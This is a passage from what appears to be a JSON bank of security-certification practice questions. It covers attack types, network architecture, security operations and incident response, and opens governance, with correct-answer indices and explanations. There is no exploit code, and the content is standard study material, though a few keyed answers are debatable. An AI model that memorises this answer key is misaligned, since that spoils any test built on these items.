(CSRF)", "XSS", "Session hijacking"], "correct": 1, "explanation": "CSRF exploits trust a website has in an authenticated user, tricking them into executing unwanted actions."}, {"id": "D2-Q031", "domain": 2, "question": "What is vishing?", "options": ["Visual hacking", "Voice phishing via phone", "Video phishing", "Virtual phishing"], "correct": 1, "explanation": "Vishing (voice phishing) uses phone calls to manipulate victims into revealing sensitive information."}, {"id": "D2-Q032", "domain": 2, "question": "Which attack corrupts DNS cache data?", "options": ["DNS poisoning", "Domain hijacking", "URL redirection", "Subdomain takeover"], "correct": 0, "explanation": "DNS poisoning corrupts DNS cache data, causing queries to return incorrect IPs and redirect users to malicious sites."}, {"id": "D2-Q033", "domain": 2, "question": "What is fileless malware?", "options": ["Malware that deletes files", "Malware operating in memory without writing to disk", "Malware affecting network only", "Cloud-based malware"], "correct": 1, "explanation": "Fileless malware operates entirely in memory using legitimate tools, making it harder to detect."}, {"id": "D2-Q034", "domain": 2, "question": "Which attack uses text messages to trick users?", "options": ["Vishing", "Phishing", "Smishing", "Whaling"], "correct": 2, "explanation": "Smishing (SMS phishing) uses text messages to deceive victims into revealing information or clicking malicious links."}, {"id": "D2-Q035", "domain": 2, "question": "What distinguishes white hat from black hat hackers?", "options": ["Technical skill", "Tools used", "Intent and authorization", "Target selection"], "correct": 2, "explanation": "White hat hackers work legally with authorization, while black hat hackers act maliciously without permission."}, {"id": "D2-Q036", "domain": 2, "question": "Which attack exploits race conditions?", "options": ["Time-of-check to time-of-use (TOCTOU)", "Buffer overflow", "Integer overflow", "SQL injection"], "correct": 0, "explanation": "TOCTOU attacks exploit the time gap between checking a condition and using a resource."}, {"id": "D2-Q037", "domain": 2, "question": "What is a birthday attack used against?", "options": ["Authentication", "Hash functions", "Encryption", "Network protocols"], "correct": 1, "explanation": "Birthday attacks exploit hash collision probabilities to find two inputs producing the same hash output."}, {"id": "D2-Q038", "domain": 2, "question": "Which vulnerability occurs from improper input validation?", "options": ["Input validation vulnerability", "Authentication bypass", "Privilege escalation", "Memory leak"], "correct": 0, "explanation": "Input validation vulnerabilities occur when applications don't properly check user input, allowing injection attacks."}, {"id": "D2-Q039", "domain": 2, "question": "What is session hijacking?", "options": ["Creating sessions", "Taking over an authenticated session", "Ending sessions", "Monitoring sessions"], "correct": 1, "explanation": "Session hijacking involves stealing or predicting session tokens to take over authenticated sessions."}, {"id": "D2-Q040", "domain": 2, "question": "Which attack floods targets with ICMP echo requests?", "options": ["Smurf attack", "Ping flood", "SYN flood", "UDP flood"], "correct": 1, "explanation": "Ping flood attacks overwhelm targets with ICMP echo request packets to exhaust bandwidth and resources."}, {"id": "D2-Q041", "domain": 2, "question": "What is the primary goal of reconnaissance?", "options": ["To damage systems", "To gather information about targets", "To steal data", "To install malware"], "correct": 1, "explanation": "Reconnaissance gathers information about targets to identify vulnerabilities and plan attacks."}, {"id": "D2-Q042", "domain": 2, "question": "Which attack uses multiple compromised systems?", "options": ["DoS", "DDoS", "Ping flood", "Smurf attack"], "correct": 1, "explanation": "Distributed Denial of Service (DDoS) attacks use multiple compromised systems to overwhelm targets."}, {"id": "D2-Q043", "domain": 2, "question": "What is privilege escalation?", "options": ["Granting privileges", "Gaining higher access than authorized", "Escalating tickets", "Increasing privileges legitimately"], "correct": 1, "explanation": "Privilege escalation exploits vulnerabilities to gain elevated access rights beyond what was authorized."}, {"id": "D2-Q044", "domain": 2, "question": "Which attack uses pre-computed hash tables?", "options": ["Brute force", "Dictionary attack", "Rainbow table", "Password spraying"], "correct": 2, "explanation": "Rainbow table attacks use pre-computed hash tables to quickly reverse hash functions and crack passwords."}, {"id": "D2-Q045", "domain": 2, "question": "What is clickjacking?", "options": ["Stealing clicks", "Tricking users into clicking hidden elements", "Recording clicks", "Preventing clicks"], "correct": 1, "explanation": "Clickjacking overlays transparent elements over legitimate content, tricking users into clicking malicious links."}, {"id": "D2-Q046", "domain": 2, "question": "Which attack exploits XML parsers?", "options": ["SQL injection", "XML external entity (XXE)", "XSS", "LDAP injection"], "correct": 1, "explanation": "XXE attacks exploit vulnerable XML parsers to access local files or execute remote requests."}, {"id": "D2-Q047", "domain": 2, "question": "What is pass-the-hash?", "options": ["Sharing hashes", "Using captured hashes for authentication", "Encrypting passwords", "Generating hashes"], "correct": 1, "explanation": "Pass-the-hash attacks use captured password hashes to authenticate without cracking the actual password."}, {"id": "D2-Q048", "domain": 2, "question": "Which vulnerability allows including malicious files?", "options": ["File inclusion", "Directory traversal", "SQL injection", "Command injection"], "correct": 0, "explanation": "File inclusion vulnerabilities allow attackers to include and execute malicious files from local or remote sources."}, {"id": "D2-Q049", "domain": 2, "question": "What is an exploit kit?", "options": ["Development tools", "Automated framework delivering exploits", "Testing tools", "Patching tools"], "correct": 1, "explanation": "Exploit kits are automated tools that scan for vulnerabilities and deploy appropriate exploits."}, {"id": "D2-Q050", "domain": 2, "question": "Which attack targets high-profile individuals?", "options": ["Phishing", "Spear phishing", "Whaling", "Vishing"], "correct": 2, "explanation": "Whaling specifically targets high-profile individuals like executives with customized phishing attacks."}, {"id": "D3-Q001", "domain": 3, "question": "What is the primary purpose of network segmentation?", "options": ["To increase network speed", "To isolate network sections and contain security breaches", "To reduce hardware costs", "To simplify network management"], "correct": 1, "explanation": "Network segmentation divides networks into isolated sections to contain breaches, limit lateral movement, and improve security."}, {"id": "D3-Q002", "domain": 3, "question": "Which device filters traffic between network segments based on rules?", "options": ["Router", "Switch", "Firewall", "Hub"], "correct": 2, "explanation": "Firewalls filter network traffic based on defined security rules, controlling what traffic can pass between network segments."}, {"id": "D3-Q003", "domain": 3, "question": "What is the purpose of a DMZ (Demilitarized Zone)?", "options": ["To provide wireless access", "To isolate public-facing services from internal networks", "To store military data", "To increase internet speed"], "correct": 1, "explanation": "A DMZ is a network segment that isolates public-facing services from the internal network, adding an extra security layer."}, {"id": "D3-Q004", "domain": 3, "question": "Which architecture model assumes no trust by default, even for internal traffic?", "options": ["Perimeter security", "Zero trust", "Defense in depth", "Network segmentation"], "correct": 1, "explanation": "Zero trust architecture operates on 'never trust, always verify,' requiring authentication and authorization for all access regardless of location."}, {"id": "D3-Q005", "domain": 3, "question": "What does a proxy server do?", "options": ["Stores backup data", "Acts as intermediary between clients and servers", "Encrypts network traffic", "Monitors physical security"], "correct": 1, "explanation": "A proxy server acts as an intermediary between clients and servers, forwarding requests and responses while potentially filtering or caching content."}, {"id": "D3-Q006", "domain": 3, "question": "Which security control inspects traffic at the application layer?", "options": ["Packet filter firewall", "Network firewall", "Web application firewall (WAF)", "Circuit-level gateway"], "correct": 2, "explanation": "WAFs operate at the application layer, inspecting HTTP/HTTPS traffic to protect web applications from attacks like SQL injection and XSS."}, {"id": "D3-Q007", "domain": 3, "question": "What is the primary function of a VPN?", "options": ["To increase network speed", "To create secure encrypted tunnels over public networks", "To filter spam emails", "To backup data"], "correct": 1, "explanation": "VPNs create encrypted tunnels over public networks, providing secure remote access and protecting data confidentiality."}, {"id": "D3-Q008", "domain": 3, "question": "Which technology creates isolated networks on a single physical infrastructure?", "options": ["Subnetting", "VLAN", "NAT", "VPN"], "correct": 1, "explanation": "VLANs (Virtual Local Area Networks) create logically separated networks on the same physical infrastructure for improved security and management."}, {"id": "D3-Q009", "domain": 3, "question": "What is the purpose of Network Access Control (NAC)?", "options": ["To control internet bandwidth", "To enforce security policies before devices access the network", "To provide wireless connectivity", "To filter email traffic"], "correct": 1, "explanation": "NAC enforces security policies by verifying device compliance before granting network access, ensuring only authorized and compliant devices connect."}, {"id": "D3-Q010", "domain": 3, "question": "Which protocol provides secure remote access to network devices?", "options": ["Telnet", "SSH", "FTP", "HTTP"], "correct": 1, "explanation": "SSH (Secure Shell) provides encrypted remote access to network devices, replacing insecure protocols like Telnet."}, {"id": "D3-Q011", "domain": 3, "question": "What is an air gap?", "options": ["A physical separation between networks with no connection", "A gap in firewall rules", "Space between servers", "A wireless network range"], "correct": 0, "explanation": "An air gap is physical isolation between networks with no direct connection, providing the highest level of network separation."}, {"id": "D3-Q012", "domain": 3, "question": "Which device aggregates logs from multiple sources for analysis?", "options": ["Firewall", "IDS", "SIEM", "Router"], "correct": 2, "explanation": "SIEM (Security Information and Event Management) systems collect, aggregate, and analyze logs from multiple sources for security monitoring."}, {"id": "D3-Q013", "domain": 3, "question": "What is the difference between IDS and IPS?", "options": ["IDS detects threats, IPS can block them", "IPS detects threats, IDS blocks them", "They are the same thing", "IDS is hardware, IPS is software"], "correct": 0, "explanation": "IDS (Intrusion Detection System) alerts on threats, while IPS (Intrusion Prevention System) can actively block malicious traffic."}, {"id": "D3-Q014", "domain": 3, "question": "Which architecture distributes resources across multiple locations for availability?", "options": ["Centralized", "Decentralized", "Distributed", "Hybrid"], "correct": 2, "explanation": "Distributed architecture spreads resources across multiple locations to improve availability, performance, and resilience."}, {"id": "D3-Q015", "domain": 3, "question": "What is micro-segmentation?", "options": ["Dividing small networks", "Granular security policies for individual workloads", "Using small network cables", "Segmenting microservices"], "correct": 1, "explanation": "Micro-segmentation applies granular security policies to individual workloads or applications, limiting lateral movement in compromised networks."}, {"id": "D3-Q016", "domain": 3, "question": "Which cloud service model provides virtualized computing resources?", "options": ["SaaS", "PaaS", "IaaS", "DaaS"], "correct": 2, "explanation": "IaaS (Infrastructure as a Service) provides virtualized computing resources like servers, storage, and networking over the internet."}, {"id": "D3-Q017", "domain": 3, "question": "What is the primary security benefit of containerization?", "options": ["Faster deployment", "Application isolation", "Reduced costs", "Better performance"], "correct": 1, "explanation": "Containerization isolates applications in separate environments, limiting the impact if one container is compromised."}, {"id": "D3-Q018", "domain": 3, "question": "Which protocol secures email transmission?", "options": ["SMTP", "POP3", "TLS/SSL", "IMAP"], "correct": 2, "explanation": "TLS/SSL protocols encrypt email transmission, protecting confidentiality when used with SMTP, POP3, or IMAP."}, {"id": "D3-Q019", "domain": 3, "question": "What is a jump server (bastion host)?", "options": ["A backup server", "A hardened system providing secure access to other systems", "A server that increases network speed", "A virtualization host"], "correct": 1, "explanation": "A jump server is a hardened, monitored system that provides controlled access to devices in different security zones."}, {"id": "D3-Q020", "domain": 3, "question": "Which technology allows multiple operating systems on one physical host?", "options": ["Containerization", "Virtualization", "Cloud computing", "Clustering"], "correct": 1, "explanation": "Virtualization allows multiple virtual machines with different operating systems to run on a single physical host."}, {"id": "D3-Q021", "domain": 3, "question": "What is the purpose of load balancing?", "options": ["Reduce costs", "Distribute traffic across multiple servers", "Increase storage", "Improve policies"], "correct": 1, "explanation": "Load balancing distributes network traffic across multiple servers for optimal resource use and availability."}, {"id": "D3-Q022", "domain": 3, "question": "Which principle limits access based on business needs?", "options": ["Defense in depth", "Least privilege", "Separation of duties", "Zero trust"], "correct": 1, "explanation": "Least privilege ensures users have only minimum access necessary for their job functions."}, {"id": "D3-Q023", "domain": 3, "question": "What is Software-Defined Networking (SDN)?", "options": ["Hardware defined by software", "Centralized control through software", "Design software", "Monitoring software"], "correct": 1, "explanation": "SDN separates control plane from data plane, allowing centralized network management through software."}, {"id": "D3-Q024", "domain": 3, "question": "Which component manages authentication and authorization?", "options": ["Firewall", "Identity and Access Management (IAM)", "VPN", "SIEM"], "correct": 1, "explanation": "IAM systems manage digital identities and control access through authentication and authorization."}, {"id": "D3-Q025", "domain": 3, "question": "What is the primary purpose of network redundancy?", "options": ["Increase security", "Ensure availability if primary fails", "Improve performance", "Reduce costs"], "correct": 1, "explanation": "Network redundancy provides backup paths and components to maintain availability during failures."}, {"id": "D3-Q026", "domain": 3, "question": "Which protocol is used for secure web browsing?", "options": ["HTTP", "HTTPS", "FTP", "Telnet"], "correct": 1, "explanation": "HTTPS uses TLS/SSL to encrypt HTTP traffic, providing secure communication for web browsing."}, {"id": "D3-Q027", "domain": 3, "question": "What is NAT?", "options": ["Name translation", "Mapping private IPs to public IPs", "Encrypting traffic", "Segmenting networks"], "correct": 1, "explanation": "NAT translates private IP addresses to public IPs, conserving addresses and hiding internal structure."}, {"id": "D3-Q028", "domain": 3, "question": "Which cloud model is used exclusively by one organization?", "options": ["Public cloud", "Private cloud", "Hybrid cloud", "Community cloud"], "correct": 1, "explanation": "Private cloud infrastructure is dedicated to a single organization for greater control."}, {"id": "D3-Q029", "domain": 3, "question": "What is East-West traffic?", "options": ["Client to server", "Server to server within datacenter", "Internet-bound", "Backup traffic"], "correct": 1, "explanation": "East-West traffic flows between servers within a data center, not entering/leaving it."}, {"id": "D3-Q030", "domain": 3, "question": "Which control monitors DNS queries?", "options": ["DNS firewall", "Web proxy", "Email gateway", "VPN"], "correct": 0, "explanation": "DNS firewalls filter DNS queries to block access to malicious domains."}, {"id": "D3-Q031", "domain": 3, "question": "What is the purpose of API security?", "options": ["Increase speed", "Protect APIs from attacks", "Develop APIs", "Document APIs"], "correct": 1, "explanation": "API security protects interfaces through authentication, authorization, encryption, and validation."}, {"id": "D3-Q032", "domain": 3, "question": "Which technology provides secure wireless access?", "options": ["WEP", "WPA3", "MAC filtering", "SSID hiding"], "correct": 1, "explanation": "WPA3 provides the strongest security for wireless networks with improved encryption."}, {"id": "D3-Q033", "domain": 3, "question": "What is a security zone?", "options": ["Physical area", "Network segment with specific security requirements", "Time zone", "Restricted area"], "correct": 1, "explanation": "Security zones are network segments with similar security requirements separated by controls."}, {"id": "D3-Q034", "domain": 3, "question": "Which architecture uses multiple cloud providers?", "options": ["Single cloud", "Multi-cloud", "Hybrid cloud", "Private cloud"], "correct": 1, "explanation": "Multi-cloud architecture uses services from multiple providers to avoid vendor lock-in."}, {"id": "D3-Q035", "domain": 3, "question": "What is DLP?", "options": ["Preventing hardware failures", "Detecting and preventing unauthorized data transmission", "Preventing corruption", "Preventing crashes"], "correct": 1, "explanation": "DLP systems monitor, detect, and prevent unauthorized transmission of sensitive data."}, {"id": "D3-Q036", "domain": 3, "question": "Which protocol provides time synchronization?", "options": ["HTTP", "NTP", "SNMP", "DNS"], "correct": 1, "explanation": "NTP (Network Time Protocol) synchronizes clocks across network devices."}, {"id": "D3-Q037", "domain": 3, "question": "What is serverless architecture?", "options": ["No servers", "Cloud provider manages infrastructure", "Client-side only", "Peer-to-peer"], "correct": 1, "explanation": "Serverless allows code execution without managing servers, with provider handling infrastructure."}, {"id": "D3-Q038", "domain": 3, "question": "Which control protects against email threats?", "options": ["Firewall", "Email gateway", "VPN", "IDS"], "correct": 1, "explanation": "Email gateways filter email for spam, malware, phishing, and data loss prevention."}, {"id": "D3-Q039", "domain": 3, "question": "What does NAC enforce?", "options": ["Internet speed", "Security policy compliance before access", "Cable management", "Wireless signals"], "correct": 1, "explanation": "NAC ensures devices meet security requirements before accessing the network."}, {"id": "D3-Q040", "domain": 3, "question": "Which architecture separates presentation, application, and data?", "options": ["Monolithic", "Three-tier", "Peer-to-peer", "Client-server"], "correct": 1, "explanation": "Three-tier architecture separates layers for better security, scalability, and maintenance."}, {"id": "D3-Q041", "domain": 3, "question": "What is a screened subnet?", "options": ["Wireless network", "DMZ with firewalls on both sides", "Internal network", "Guest network"], "correct": 1, "explanation": "A screened subnet (DMZ) has firewalls between internet and DMZ, and between DMZ and internal network."}, {"id": "D3-Q042", "domain": 3, "question": "Which security model uses security labels?", "options": ["DAC", "MAC", "RBAC", "ABAC"], "correct": 1, "explanation": "MAC (Mandatory Access Control) uses security labels to enforce access based on classification levels."}, {"id": "D3-Q043", "domain": 3, "question": "What is network access control list (NACL)?", "options": ["User list", "Firewall rules for subnets", "Router configuration", "Switch settings"], "correct": 1, "explanation": "NACLs are stateless firewall rules that control traffic at the subnet level in networks."}, {"id": "D3-Q044", "domain": 3, "question": "Which protocol secures file transfers?", "options": ["FTP", "SFTP", "HTTP", "Telnet"], "correct": 1, "explanation": "SFTP (SSH File Transfer Protocol) provides secure encrypted file transfers."}, {"id": "D3-Q045", "domain": 3, "question": "What is infrastructure as code (IaC)?", "options": ["Coding infrastructure", "Managing infrastructure through code", "Infrastructure documentation", "Hardware programming"], "correct": 1, "explanation": "IaC manages and provisions infrastructure through machine-readable definition files."}, {"id": "D3-Q046", "domain": 3, "question": "Which technology isolates network traffic at layer 2?", "options": ["Subnetting", "VLAN", "VPN", "Firewall"], "correct": 1, "explanation": "VLANs logically segment networks at layer 2 for isolation and security."}, {"id": "D3-Q047", "domain": 3, "question": "What is a next-generation firewall (NGFW)?", "options": ["Newer firewall hardware", "Firewall with application awareness and IPS", "Faster firewall", "Cloud firewall"], "correct": 1, "explanation": "NGFWs combine traditional firewall with application-level inspection, IPS, and threat intelligence."}, {"id": "D3-Q048", "domain": 3, "question": "Which architecture principle separates management from data traffic?", "options": ["Segmentation", "Out-of-band management", "Virtualization", "Load balancing"], "correct": 1, "explanation": "Out-of-band management uses separate network for management traffic, improving security."}, {"id": "D3-Q049", "domain": 3, "question": "What is SD-WAN?", "options": ["Software-defined wide area network", "Secure data WAN", "Standard WAN", "Static WAN"], "correct": 0, "explanation": "SD-WAN uses software to manage and optimize WAN connections across multiple sites."}, {"id": "D3-Q050", "domain": 3, "question": "Which access control model uses policies based on attributes?", "options": ["DAC", "MAC", "RBAC", "ABAC"], "correct": 3, "explanation": "ABAC (Attribute-Based Access Control) makes decisions based on attributes of users, resources, and environment."}, {"id": "D4-Q001", "domain": 4, "question": "What is the purpose of security monitoring?", "options": ["To increase system performance", "To detect and respond to security incidents", "To reduce network traffic", "To manage user accounts"], "correct": 1, "explanation": "Security monitoring continuously observes systems and networks to detect, analyze, and respond to security incidents and threats."}, {"id": "D4-Q002", "domain": 4, "question": "Which log type records user authentication attempts?", "options": ["System logs", "Application logs", "Security logs", "Performance logs"], "correct": 2, "explanation": "Security logs record authentication events, including successful and failed login attempts, for audit and investigation purposes."}, {"id": "D4-Q003", "domain": 4, "question": "What is the first step in incident response?", "options": ["Containment", "Eradication", "Preparation", "Recovery"], "correct": 2, "explanation": "Preparation is the first phase, involving developing plans, training staff, and establishing tools and procedures before incidents occur."}, {"id": "D4-Q004", "domain": 4, "question": "Which process involves identifying security weaknesses through controlled testing?", "options": ["Patch management", "Vulnerability assessment", "Change management", "Configuration management"], "correct": 1, "explanation": "Vulnerability assessment systematically identifies, quantifies, and prioritizes security weaknesses in systems and networks."}, {"id": "D4-Q005", "domain": 4, "question": "What is the purpose of a security baseline?", "options": ["To set minimum security requirements for systems", "To measure network performance", "To calculate security budgets", "To determine staffing needs"], "correct": 0, "explanation": "A security baseline establishes minimum security settings and configurations that all systems must meet."}, {"id": "D4-Q006", "domain": 4, "question": "Which type of backup copies only changed data since the last full backup?", "options": ["Full backup", "Incremental backup", "Differential backup", "Snapshot backup"], "correct": 2, "explanation": "Differential backups copy all data changed since the last full backup, requiring only the full and latest differential for restoration."}, {"id": "D4-Q007", "domain": 4, "question": "What is the primary purpose of patch management?", "options": ["To improve system performance", "To update software and fix security vulnerabilities", "To add new features", "To reduce storage usage"], "correct": 1, "explanation": "Patch management ensures systems are updated with security patches to fix vulnerabilities and maintain security posture."}, {"id": "D4-Q008", "domain": 4, "question": "Which incident response phase involves removing the threat from systems?", "options": ["Identification", "Containment", "Eradication", "Recovery"], "correct": 2, "explanation": "Eradication removes the threat, malware, or unauthorized access from affected systems after containment."}, {"id": "D4-Q009", "domain": 4, "question": "What is forensic imaging?", "options": ["Taking photos of crime scenes", "Creating exact copies of storage media for investigation", "Enhancing security camera footage", "Drawing network diagrams"], "correct": 1, "explanation": "Forensic imaging creates bit-by-bit copies of storage media to preserve evidence without altering the original."}, {"id": "D4-Q010", "domain": 4, "question": "Which metric measures how long a service can be unavailable?", "options": ["MTTR", "MTBF", "RTO", "RPO"], "correct": 2, "explanation": "RTO (Recovery Time Objective) defines the maximum acceptable time a service can be down after an incident."}, {"id": "D4-Q011", "domain": 4, "question": "What is the purpose of hardening a system?", "options": ["To make it physically stronger", "To reduce attack surface by removing unnecessary features", "To increase processing power", "To improve user experience"], "correct": 1, "explanation": "Hardening reduces the attack surface by disabling unnecessary services, removing unused software, and applying security configurations."}, {"id": "D4-Q012", "domain": 4, "question": "Which process ensures changes don't negatively impact security?", "options": ["Patch management", "Change management", "Asset management", "Configuration management"], "correct": 1, "explanation": "Change management controls and documents system changes to ensure they're properly reviewed, tested, and don't introduce vulnerabilities."}, {"id": "D4-Q013", "domain": 4, "question": "What is a Security Operations Center (SOC)?", "options": ["A physical security facility", "A team that monitors and responds to security incidents", "A type of firewall", "A compliance framework"], "correct": 1, "explanation": "A SOC is a centralized unit that monitors, detects, investigates, and responds to security incidents 24/7."}, {"id": "D4-Q014", "domain": 4, "question": "Which backup type copies only data changed since the last backup of any type?", "options": ["Full backup", "Incremental backup", "Differential backup", "Mirror backup"], "correct": 1, "explanation": "Incremental backups copy only data changed since the last backup of any type, requiring all increments for full restoration."}, {"id": "D4-Q015", "domain": 4, "question": "What is the chain of custody?", "options": ["Management hierarchy", "Documentation of evidence handling", "Security clearance levels", "Network topology"], "correct": 1, "explanation": "Chain of custody documents who handled evidence, when, and how to maintain its integrity for legal proceedings."}, {"id": "D4-Q016", "domain": 4, "question": "Which metric measures average time between system failures?", "options": ["MTTR", "MTBF", "RTO", "RPO"], "correct": 1, "explanation": "MTBF (Mean Time Between Failures) measures the average time a system operates before experiencing a failure."}, {"id": "D4-Q017", "domain": 4, "question": "What is the purpose of vulnerability scanning?", "options": ["To exploit vulnerabilities", "To identify potential security weaknesses", "To improve system performance", "To reduce costs"], "correct": 1, "explanation": "Vulnerability scanning automatically identifies known security weaknesses in systems, applications, and networks."}, {"id": "D4-Q018", "domain": 4, "question": "Which incident response phase involves restoring normal operations?", "options": ["Containment", "Eradication", "Recovery", "Lessons learned"], "correct": 2, "explanation": "Recovery involves restoring systems to normal operations and verifying they're functioning properly and securely."}, {"id": "D4-Q019", "domain": 4, "question": "What is penetration testing?", "options": ["Testing network cable quality", "Simulating attacks to identify vulnerabilities", "Testing user passwords", "Testing backup procedures"], "correct": 1, "explanation": "Penetration testing simulates real-world attacks to identify vulnerabilities and assess security effectiveness."}, {"id": "D4-Q020", "domain": 4, "question": "Which log aggregation method collects logs from multiple sources?", "options": ["Local logging", "Centralized logging", "Distributed logging", "Cloud logging"], "correct": 1, "explanation": "Centralized logging collects logs from multiple sources into a single repository for analysis, correlation, and retention."}, {"id": "D4-Q021", "domain": 4, "question": "What is configuration management?", "options": ["Managing cables", "Maintaining consistent system configurations", "User accounts", "Licenses"], "correct": 1, "explanation": "Configuration management maintains consistent, documented system configurations and tracks changes."}, {"id": "D4-Q022", "domain": 4, "question": "Which metric defines maximum data loss?", "options": ["MTTR", "MTBF", "RTO", "RPO"], "correct": 3, "explanation": "RPO (Recovery Point Objective) defines maximum acceptable data loss measured in time."}, {"id": "D4-Q023", "domain": 4, "question": "What is security orchestration?", "options": ["Playing music", "Automating and coordinating security tools", "Organizing staff", "Prioritizing vulnerabilities"], "correct": 1, "explanation": "Security orchestration automates and coordinates multiple security tools and processes."}, {"id": "D4-Q024", "domain": 4, "question": "Which evidence type includes electronic data?", "options": ["Physical", "Digital", "Documentary", "Testimonial"], "correct": 1, "explanation": "Digital evidence includes data stored or transmitted electronically."}, {"id": "D4-Q025", "domain": 4, "question": "What is threat hunting?", "options": ["Hunting employees", "Proactively searching for threats", "Removing threats", "Documenting threats"], "correct": 1, "explanation": "Threat hunting proactively searches for threats that evaded existing security controls."}, {"id": "D4-Q026", "domain": 4, "question": "Which process tracks organizational assets?", "options": ["Change management", "Asset management", "Configuration management", "Patch management"], "correct": 1, "explanation": "Asset management tracks and maintains inventory of all organizational hardware, software, and data."}, {"id": "D4-Q027", "domain": 4, "question": "What is security automation?", "options": ["Eliminating staff", "Performing tasks without manual intervention", "Auto-hacking", "Reducing budgets"], "correct": 1, "explanation": "Security automation handles repetitive tasks like log analysis and alert triage automatically."}, {"id": "D4-Q028", "domain": 4, "question": "Which phase determines if an incident occurred?", "options": ["Preparation", "Identification", "Containment", "Recovery"], "correct": 1, "explanation": "Identification determines whether a security incident occurred and assesses its scope."}, {"id": "D4-Q029", "domain": 4, "question": "What is volatility in forensics?", "options": ["How dangerous evidence is", "How quickly data can be lost", "How much data exists", "How encrypted data is"], "correct": 1, "explanation": "Volatility refers to how quickly data can be lost, requiring collection of most volatile data first."}, {"id": "D4-Q030", "domain": 4, "question": "Which metric measures average repair time?", "options": ["MTTR", "MTBF", "RTO", "RPO"], "correct": 0, "explanation": "MTTR (Mean Time To Repair) measures average time to repair and restore after failure."}, {"id": "D4-Q031", "domain": 4, "question": "What is a security playbook?", "options": ["Children's book", "Documented procedures for incidents", "Training manual", "Compliance checklist"], "correct": 1, "explanation": "Security playbooks contain documented procedures for responding to specific incident types."}, {"id": "D4-Q032", "domain": 4, "question": "Which process safely disposes of data?", "options": ["Encryption", "Sanitization", "Backup", "Archiving"], "correct": 1, "explanation": "Sanitization permanently removes data through overwriting, degaussing, or destruction."}, {"id": "D4-Q033", "domain": 4, "question": "What establishes minimum security configurations?", "options": ["Security baselines", "Network speed", "Costs", "Training"], "correct": 0, "explanation": "Security baselines establish minimum configuration standards all systems must meet."}, {"id": "D4-Q034", "domain": 4, "question": "Which strategy isolates affected systems?", "options": ["Eradication", "Segmentation", "Recovery", "Identification"], "correct": 1, "explanation": "Segmentation isolates compromised systems to prevent threat spread during incidents."}, {"id": "D4-Q035", "domain": 4, "question": "What is order of volatility?", "options": ["Most volatile to least", "Least to most", "Largest to smallest", "Oldest to newest"], "correct": 0, "explanation": "Evidence collection follows most volatile (RAM) to least volatile (hard drives) order."}, {"id": "D4-Q036", "domain": 4, "question": "Which testing has NO knowledge of target?", "options": ["White box", "Black box", "Gray box", "Clear box"], "correct": 1, "explanation": "Black box testing simulates external attacker with no prior target knowledge."}, {"id": "D4-Q037", "domain": 4, "question": "What is security posture?", "options": ["Sitting position", "Overall security strength and readiness", "Physical stance", "Policy documentation"], "correct": 1, "explanation": "Security posture represents overall security strength, controls, and readiness to prevent/respond."}, {"id": "D4-Q038", "domain": 4, "question": "Which logs are most useful for incidents?", "options": ["Performance", "Application", "Security", "System"], "correct": 2, "explanation": "Security logs record authentication and security events critical for investigation."}, {"id": "D4-Q039", "domain": 4, "question": "What is tabletop exercise?", "options": ["Physical testing", "Discussion-based scenario walkthrough", "New hire training", "Backup testing"], "correct": 1, "explanation": "Tabletop exercises discuss incident scenarios to test response procedures."}, {"id": "D4-Q040", "domain": 4, "question": "Which technique recovers deleted files?", "options": ["File recovery", "Data carving", "Steganography", "Encryption"], "correct": 1, "explanation": "Data carving recovers files from unallocated space by identifying file signatures."}, {"id": "D4-Q041", "domain": 4, "question": "What documents identified risks?", "options": ["Risk register", "Device list", "Control list", "Audit log"], "correct": 0, "explanation": "Risk register documents identified risks, likelihood, impact, and mitigation strategies."}, {"id": "D4-Q042", "domain": 4, "question": "Which backup uses incrementals with periodic fulls?", "options": ["Full only", "Differential", "Incremental", "Grandfather-father-son"], "correct": 3, "explanation": "Grandfather-father-son combines full backups with incrementals for long-term retention."}, {"id": "D4-Q043", "domain": 4, "question": "What is security information sharing?", "options": ["Sharing passwords", "Exchanging threat intelligence", "Publishing policies", "Training"], "correct": 1, "explanation": "Security information sharing exchanges threat intelligence and best practices between organizations."}, {"id": "D4-Q044", "domain": 4, "question": "Which metric indicates availability?", "options": ["Uptime percentage", "Response time", "Throughput", "Bandwidth"], "correct": 0, "explanation": "Uptime percentage measures proportion of time systems are operational."}, {"id": "D4-Q045", "domain": 4, "question": "What is quarantine in IR?", "options": ["Deleting systems", "Isolating compromised systems", "Improving performance", "Backing up"], "correct": 1, "explanation": "Quarantine isolates compromised systems to prevent spread while allowing analysis."}, {"id": "D4-Q046", "domain": 4, "question": "Which testing has full knowledge?", "options": ["Black box", "White box", "Gray box", "Blind testing"], "correct": 1, "explanation": "White box testing has complete knowledge including source code and architecture."}, {"id": "D4-Q047", "domain": 4, "question": "What is security alerting?", "options": ["Training staff", "Automated notifications of events", "Physical alarms", "Posters"], "correct": 1, "explanation": "Security alerting automatically notifies personnel of potential incidents or violations."}, {"id": "D4-Q048", "domain": 4, "question": "Which retention factor is most important?", "options": ["Storage costs", "Legal requirements", "Performance", "Preferences"], "correct": 1, "explanation": "Legal and regulatory requirements dictate minimum retention periods for compliance."}, {"id": "D4-Q049", "domain": 4, "question": "What measures program effectiveness?", "options": ["Punishing employees", "Security metrics", "Reducing budgets", "Creating policies"], "correct": 1, "explanation": "Security metrics quantitatively measure security program effectiveness and trends."}, {"id": "D4-Q050", "domain": 4, "question": "Which phase reviews incidents?", "options": ["Preparation", "Identification", "Recovery", "Lessons learned"], "correct": 3, "explanation": "Lessons learned reviews incidents and responses to identify improvements."}, {"id": "D5-Q001", "domain": 5, "question": "What is the primary purpose of a security policy?", "options": ["To document security incidents", "To establish high-level security objectives and principles", "To provide step-by-step instructions", "To list security tools"], "correct": 1, "explanation": "Security policies establish high-level security objectives, principles, and management direction for the organization."}, {"id": "D5-Q002", "domain": 5, "question": "Which document provides detailed step-by-step instructions?", "options": ["Policy", "Standard", "Procedure", "Guideline"], "correct": 2, "explanation": "Procedures provide detailed, step-by-step instructions for completing specific security-related tasks or processes."}, {"id": "D5-Q003", "domain": 5, "question": "What is risk appetite?", "options": ["The amount of food security staff consume", "The level of risk an organization is willing to accept", "The desire to take risks", "The cost of security controls"], "correct": 1, "explanation": "Risk appetite is the amount and type of risk an organization is willing to accept in pursuit of business objectives."}, {"id": "D5-Q004", "domain": 5, "question": "Which framework provides security controls for federal information systems?", "options": ["ISO 27001", "NIST SP 800-53", "PCI DSS", "COBIT"], "correct": 1, "explanation": "NIST SP 800-53 provides comprehensive security and privacy controls for federal information systems and organizations."}, {"id": "D5-Q005", "domain": 5, "question": "What is the purpose of vendor risk management?", "options": ["To eliminate all vendors", "To assess and mitigate risks from third-party vendors", "To negotiate lower prices", "To manage vendor contracts"], "correct": 1, "explanation": 